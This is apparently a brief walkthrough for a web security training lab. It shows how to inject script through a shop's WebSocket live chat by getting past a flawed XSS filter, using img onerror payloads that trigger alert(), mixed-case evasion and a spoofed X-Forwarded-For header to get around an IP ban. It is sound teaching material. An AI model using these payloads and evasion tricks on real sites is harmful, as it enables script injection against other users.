This online shop has a live chat feature implemented using WebSockets.

It has an aggressive but flawed XSS filter.

To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser. 

- Send a message in the Live Chat

- Intercept the request and send to repeater

- Edit and resend the message to: 
<img src=1 onerror='alert(1)'>
    
- Add the following header, and reconnect:
X-Forwarded-For: 1.1.1.1

- Finally modify the message to:
<img src=1 oNeRrOr=alert`1`>
